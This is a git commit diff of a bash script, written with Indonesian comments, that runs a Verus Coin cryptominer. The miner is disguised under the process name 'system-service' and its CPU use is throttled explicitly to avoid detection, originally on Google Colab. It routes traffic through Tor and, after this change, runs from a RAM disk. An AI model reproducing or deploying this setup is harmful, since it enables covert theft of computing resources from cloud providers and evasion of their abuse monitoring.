85e83dda1f1afdd23d1780599afd72bd3f7c2ee7
Andik152 <ltc24ever@gmail.com>
2025-07-22 09:09:22 +0700

    Update start-mining.sh

--- start-mining.sh
+++ start-mining.sh
@@ -1,12 +1,13 @@
 #!/bin/bash
 # File: start-mining.sh
-# Deskripsi: Mining Verus Coin di Google Colab dengan enkripsi
+# Deskripsi: Mining Verus Coin di RAM disk dengan enkripsi
 
-# Batasi CPU ke 70% untuk hindari deteksi Colab
-cpulimit -e system-service -l 70 &
+# Batasi CPU ke 60% untuk hindari deteksi
+cpulimit -e system-service -l 60 &
 
-# Gunakan Tor sebagai proxy (pastikan Tor sudah berjalan)
+# Gunakan Tor sebagai proxy
 export ALL_PROXY=socks5h://127.0.0.1:9050
 
-# Jalankan miner
+# Jalankan miner di RAM disk
+cd /dev/shm/verus-mining
 ./system-service -a verushash -o stratum+ssl://ap.luckpool.net:3956 -u RU1DbwVyrMKaiLdMWapCYfhiC82FijAgbw.worker -p x -t $(($(nproc --all) - 1))
